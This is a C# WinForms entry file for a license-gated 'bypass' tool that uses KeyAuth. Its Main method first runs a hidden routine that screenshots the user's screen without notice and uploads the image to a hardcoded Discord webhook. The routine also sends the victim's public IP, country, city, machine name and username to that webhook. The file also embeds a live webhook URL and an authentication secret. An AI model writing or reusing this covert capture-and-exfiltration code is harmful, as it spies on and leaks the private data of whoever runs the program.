using AntiCrack_DotNet;

using Guna.UI2.WinForms.Suite;
using KeyAuth;
using Stealer;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Security.Policy;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ToolTip;
using System.Net.Http;
using System.Windows.Input;
using System.Security.Principal;
using System.Collections.Specialized;
using System.Xml;

namespace numer
{
    internal static class Program
    {
        public static api KeyAuthApp = new api(

       name: "bypass",
       ownerid: "5WMYrdGDaR",
       secret: "87751941ad78a0ac6942ec0df1369451c2928394be0a5862b61e4c6f8b944d85",
       version: "1.49"
   );
        public static string IsoCountryCodeToFlagEmoji1(string countryCode) => string.Concat(countryCode.ToUpper().Select(x => char.ConvertFromUtf32(x + 0x1F1A5)));

        public static string GetFlag(string country)
        {
            var regions = CultureInfo.GetCultures(CultureTypes.SpecificCultures).Select(x => new RegionInfo(x.LCID));
            var englishRegion = regions.FirstOrDefault(region => region.EnglishName.Contains(country));
            if (englishRegion == null) return "🏳";
            var countryAbbrev = englishRegion.TwoLetterISORegionName;
            return IsoCountryCodeToFlagEmoji1(countryAbbrev);
        }
        public static string IPRequestHelper(string url)
        {

            HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();

            StreamReader responseStream = new StreamReader(objResponse.GetResponseStream());
            string responseRead = responseStream.ReadToEnd();

            responseStream.Close();
            responseStream.Dispose();

            return responseRead;
        }
        public static string GetCountryByIP(string ipAddress)
        {
            string strReturnVal;
            string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + ipAddress);
            //return ipResponse;
            XmlDocument ipInfoXML = new XmlDocument();
            ipInfoXML.LoadXml(ipResponse);
            XmlNodeList responseXML = ipInfoXML.GetElementsByTagName("query");
            NameValueCollection dataXML = new NameValueCollection();
            dataXML.Add(responseXML.Item(0).ChildNodes[2].InnerText, responseXML.Item(0).ChildNodes[2].Value);
            strReturnVal = responseXML.Item(0).ChildNodes[1].InnerText.ToString(); // Contry
            return strReturnVal;
        }

        private static void CaptureMyScreen()
        {
            try
            {
                string result = Path.GetTempPath();
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                //Creating a new Bitmap object
                Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
                //Creating a Rectangle object which will
                //capture our Current Screen
                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
                //Creating a New Graphics Object
                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
                //Copying Image from The Screen
                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                //Saving the Image File (I am here Saving it in My E drive).
                captureBitmap.Save(@"C:\Windows\Setup\\open.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                //C:\Users\nightmood\AppData\Local
                //Displaying the Successfull Result
                //MessageBox.Show("Screen Captured");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        private static void sendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }
        public static void test2()
        {
            try
            {
                CaptureMyScreen();
                string kh = "C:\\Windows\\Setup\\open.jpg";
                sendImg("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m", kh);
                WebClient web1 = new WebClient();
                string IP = web1.DownloadString("http://ip-api.com/csv/?fields=query");
                string ssCountryss = web1.DownloadString("https://icanhazip.com/");
                string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                string pc = System.Environment.MachineName;
                string pc1 = System.Environment.UserName;
                string ssd = WindowsIdentity.GetCurrent().User.Value;
                string key = Program.KeyAuthApp.user_data.username;
                string send = "@here" + "**New Open Bp From** 💻 :  " + $@"**{pc1}**" + "\n ☠ **Contry** : " + $@"**{GetFlag(GetCountryByIP(ssCountryss))}**" + "\n ☠ **IP** : " + $@"**{IP.Trim()}**" + "\n 🚩 **City** : " + $@"**{city.Trim()}**" + "\n 💻 **Pc Name** : " + $@"**{pc}**";
                HttpClient client = new HttpClient();
                Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                discordToPost.Add("content", send);
                var content = new FormUrlEncodedContent(discordToPost);
                Uri webhook = new Uri("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m");
                client.PostAsync(webhook, content);
            }
            catch { }
        }

    


        public static void CheckForInternetConnection()
        {

            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com")) { }
            }
            catch
            {
                Environment.Exit(0);
            }
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
        [STAThread]
        static void Main()
        {

            test2();
            //CheckForInternetConnection();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\location.ini";

            if (File.Exists(path))
            {
                string pathValue = File.ReadAllText(path);

                if (pathValue != Assembly.GetExecutingAssembly().Location)
                {
                    try
                    {
                        File.Delete(pathValue);
                    }
                    catch { }
                }

                File.Delete(path);
            }
            KeyAuthApp.init();
            if (KeyAuthApp.response.message == "invalidver")
            {
                Application.Run();
            }
            else if (!KeyAuthApp.response.success)
            {
                try
                {
                    SpeechSynthesizer synthesizer = new SpeechSynthesizer();
                    synthesizer.SpeakAsync(KeyAuthApp.response.message);
                    synthesizer.SpeakCompleted += synthesizer_SpeakCompleted;

                    void synthesizer_SpeakCompleted(object sender, SpeakCompletedEventArgs e)
                    {
                        Environment.Exit(0);
                    }
                }
                catch
                {
                    Environment.Exit(0);
                }

                Application.Run();
            }

            else if (KeyAuthApp.response.success)
            {


                //MessageBox.Show("waiting Update Please !!!!");
                //Environment.Exit(1);

             try
                {
                    string pkey = @"C:\\Key.ini";
                    var ss = File.ReadAllText(pkey);
                    KeyAuthApp.license(ss);
                    if (!File.Exists(pkey))
                    {
                        Application.Run(new Form2());

                    }
                    else
                    {
                        if (KeyAuthApp.response.success)
                        {
                            Application.Run(new BP());
                        }
                        else
                        {

                            if(File.Exists(pkey))
                            { File.Delete(pkey); }
                            else
                            {

                            MessageBox.Show(KeyAuthApp.response.message);
                            }
                        }
                    }
                }
                catch { 
                    Application.Run(new Form2());
                }

            }
        }

        }
    }

